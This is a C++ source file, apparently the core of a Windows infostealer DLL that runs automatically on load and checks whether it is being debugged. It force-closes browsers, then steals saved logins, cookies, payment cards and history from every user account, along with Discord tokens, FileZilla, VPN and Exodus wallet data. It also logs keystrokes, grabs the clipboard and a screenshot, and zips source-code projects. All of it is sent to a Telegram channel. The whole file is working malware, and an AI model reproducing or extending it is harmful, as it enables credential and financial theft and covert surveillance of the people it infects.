

#include "pch.hpp"
#include "config.hpp"
#include "result.hpp"
#include "http.hpp"
#include "telegram.hpp"

#if ENABLE_BROWSERSNATCH

BOOL chromium_parser(std::string username, std::string stealer_db);
BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db);
BOOL chromium_history_collector(std::string username, std::string stealer_db);
BOOL gecko_parser(std::string username, std::string stealer_db);
BOOL gecko_cookie_collector(std::string username, std::string stealer_db);
BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db);
BOOL gecko_history_collector(std::string username, std::string stealer_db);
BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter);
#endif


#include "stealers/chromium.hpp"

#if ENABLE_FILEZILLA
#include "stealers/filezilla.hpp"
#endif

#if ENABLE_DISCORD
#include "stealers/discord.hpp"
#endif

#if ENABLE_MULLVAD
#include "stealers/mullvad.hpp"
#endif

#if ENABLE_NETWORK
#include "stealers/network.hpp"
#endif

#if ENABLE_EXODUS
#include "stealers/exodus.hpp"
#endif

#if ENABLE_CLIPBOARD
#include "stealers/clipboard.hpp"
#endif

#if ENABLE_SCREENSHOT
#include "stealers/screenshot.hpp"
#endif

#if ENABLE_KEYLOGGER
#include "stealers/keylogger.hpp"
#endif

#if ENABLE_SOURCE_SCANNER
#include "stealers/source_scanner.hpp"
#endif

#if ANTIDBG
#include "debugging.hpp"
#endif


static void kill_browsers() {
    const char* targets[] = {
        "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "operagx.exe",
        "vivaldi.exe", "firefox.exe", "thunderbird.exe", "chromium.exe",
        "yandex.exe", "seamonkey.exe"
    };
    for (auto t : targets) {
        hidden_system(va("taskkill /f /im %s >nul 2>&1", t).c_str());
    }
    Sleep(800);
}


static std::string machine_tag() {
    char comp[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(comp);
    GetComputerNameA(comp, &sz);
    return "[" + std::string(comp) + "\\" + get_username() + "]";
}

static void run_all() {
#if ANTIDBG
    if (is_debugged()) return;
#endif

    kill_browsers();

    std::string tag = machine_tag();


#if ENABLE_KEYLOGGER
    Keylogger::start();
#endif


#if ENABLE_BROWSERSNATCH

    std::string username = get_username();
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string stealer_db = std::string(tmp) + "d" + std::to_string(GetTickCount64() & 0xFFFFFF) + ".db";

    try { chromium_parser(username, stealer_db); } catch (...) {}
    try { chromium_cookie_collector(username, stealer_db); } catch (...) {}
    try { chromium_bookmarks_collector(username, stealer_db); } catch (...) {}
    try { chromium_history_collector(username, stealer_db); } catch (...) {}
    try { gecko_parser(username, stealer_db); } catch (...) {}
    try { gecko_cookie_collector(username, stealer_db); } catch (...) {}
    try { gecko_bookmarks_collector(username, stealer_db); } catch (...) {}
    try { gecko_history_collector(username, stealer_db); } catch (...) {}

    try { app_bound_browsers_cookie_collector(username, stealer_db, false, ""); } catch (...) {}


    try {
        for (const auto& entry : std::filesystem::directory_iterator("C:\\users")) {
            if (!entry.is_directory()) continue;
            std::string other_user = entry.path().filename().string();
            if (other_user == username || other_user == "Public" ||
                other_user == "Default" || other_user == "Default User" ||
                other_user == "All Users") continue;
            try { chromium_parser(other_user, stealer_db); } catch (...) {}
            try { chromium_cookie_collector(other_user, stealer_db); } catch (...) {}
            try { chromium_bookmarks_collector(other_user, stealer_db); } catch (...) {}
            try { chromium_history_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_parser(other_user, stealer_db); } catch (...) {}
            try { gecko_cookie_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_bookmarks_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_history_collector(other_user, stealer_db); } catch (...) {}
        }
    } catch (...) {}


    if (std::filesystem::exists(stealer_db) && std::filesystem::file_size(stealer_db) > 0) {
        telegram::upload_file(s2ws(stealer_db));
        try { std::filesystem::remove(stealer_db); } catch (...) {}
    }
#endif


    {
        struct {
            const char* exe;
            const char* env;
            const char* sub;
            int enc_type;
            const wchar_t* ncrypt_key_name;
        } cc_browsers[] = {
            {"chrome.exe",    "LOCALAPPDATA", "Google\\Chrome\\User Data",                1, L"Google Chromekey1"},
            {"msedge.exe",    "LOCALAPPDATA", "Microsoft\\Edge\\User Data",               2, L"Microsoft Edgekey1"},
            {"brave.exe",     "LOCALAPPDATA", "BraveSoftware\\Brave-Browser\\User Data",  2, L"Bravekey1"},
            {"opera.exe",     "APPDATA",      "Opera Software\\Opera Stable",             0, L""},
            {"vivaldi.exe",   "LOCALAPPDATA", "Vivaldi\\User Data",                       0, L""},
            {"yandex.exe",    "LOCALAPPDATA", "Yandex\\YandexBrowser\\User Data",         0, L""},
        };
        for (auto& b : cc_browsers) {
            char* env_val = nullptr; size_t len;
            _dupenv_s(&env_val, &len, b.env);
            if (!env_val) continue;
            auto path = std::filesystem::path(std::string(env_val) + "\\" + b.sub);
            free(env_val);
            if (!std::filesystem::exists(path)) continue;
            try {
                ChromiumStealer s(b.exe, path, b.enc_type, b.ncrypt_key_name, false);
                s.steal();
            } catch (...) {}
        }
    }


#if ENABLE_FILEZILLA
    try { FileZillaStealer().steal(); } catch (...) {}
#endif

#if ENABLE_DISCORD
    try { DiscordStealer().steal(); } catch (...) {}
#endif

#if ENABLE_MULLVAD
    try { MullvadStealer().steal(); } catch (...) {}
#endif

#if ENABLE_NETWORK
    try { NetworkStealer().steal(); } catch (...) {}
#endif

#if ENABLE_EXODUS
    try { ExodusStealer().steal(); } catch (...) {}
#endif


#if ENABLE_CLIPBOARD
    std::string clipboard_data;
    try {
        clipboard_data = ClipboardStealer::grab();
        if (!clipboard_data.empty()) {
            append_extra_info("Clipboard:");
            std::string truncated = clipboard_data;
            if (truncated.size() > 4096)
                truncated = truncated.substr(0, 4096) + "...";
            append_extra_info("  " + truncated);
            append_extra_info("");
        }
    } catch (...) {}
#endif


#if ENABLE_SCREENSHOT
    std::vector<uint8_t> screenshot_png;
    try {
        screenshot_png = ScreenshotCapture::capture();
        if (!screenshot_png.empty()) {

            std::vector<char> png_as_char(screenshot_png.begin(), screenshot_png.end());
            telegram::upload_data(png_as_char, "screenshot.png");
            append_extra_info("Screenshot: captured (" +
                std::to_string(screenshot_png.size()) + " bytes)");
            append_extra_info("");
        }
    } catch (...) {}
#endif


#if ENABLE_KEYLOGGER
    std::string keylog_data;
    try {
        Keylogger::stop();
        keylog_data = Keylogger::flush();
        if (!keylog_data.empty()) {
            append_extra_info("Keylog:");
            append_extra_info("  " + keylog_data);
            append_extra_info("");
        }
    } catch (...) {}
#endif


#if ENABLE_SOURCE_SCANNER
    size_t source_project_count = 0;
    try {
        auto projects = SourceScanner::scan();
        source_project_count = projects.size();
        for (const auto& proj : projects) {
            auto zip_data = SourceScanner::collect(proj);
            if (!zip_data.empty()) {

                std::string folder_name = proj;
                size_t last_sep = folder_name.find_last_of("\\/");
                if (last_sep != std::string::npos)
                    folder_name = folder_name.substr(last_sep + 1);

                std::vector<char> zip_as_char(zip_data.begin(), zip_data.end());
                telegram::upload_data(zip_as_char, folder_name + ".zip");
            }
        }
        if (source_project_count > 0) {
            append_extra_info("Source Projects: " + std::to_string(source_project_count));
            append_extra_info("");
        }
    } catch (...) {}
#endif


    std::string report = dump_results();
    if (!report.empty()) {

        std::vector<char> report_data(report.begin(), report.end());
        telegram::upload_data(report_data, "report.txt");
    }


    std::string summary = tag + " extraction done\n"
        "Logins: " + std::to_string(logins.size()) + "\n"
        "Cookies: " + std::to_string(cookies.size()) + "\n"
        "Cards: " + std::to_string(cards.size()) + "\n"
        "Discord: " + std::to_string(discord_tokens.size()) + "\n"
#if ENABLE_SCREENSHOT
        "Screenshot: " + std::string(screenshot_png.empty() ? "no" : "yes") + "\n"
#endif
#if ENABLE_KEYLOGGER
        "Keylogger: " + std::string(keylog_data.empty() ? "no data" : std::to_string(keylog_data.size()) + " chars") + "\n"
#endif
#if ENABLE_CLIPBOARD
        "Clipboard: " + std::string(clipboard_data.empty() ? "empty" : std::to_string(clipboard_data.size()) + " chars") + "\n"
#endif
#if ENABLE_SOURCE_SCANNER
        "Source Projects: " + std::to_string(source_project_count) + "\n"
#endif
        ;


    if (!summary.empty() && summary.back() == '\n')
        summary.pop_back();

    {
        std::lock_guard<std::mutex> lock(extra_info_mutex);
        std::string extra = extra_info.str();
        if (!extra.empty()) summary += "\n---\n" + extra;
    }

    telegram::send_message(summary);
}

static std::atomic<bool> s_executed{false};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);


        CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
            Sleep(2000);
            if (!s_executed.exchange(true))
                run_all();
            return 0;
        }, nullptr, 0, nullptr);
    }
    return TRUE;
}


extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst,
                                           LPSTR lpszCmdLine, int nCmdShow) {
    if (!s_executed.exchange(true))
        run_all();
}
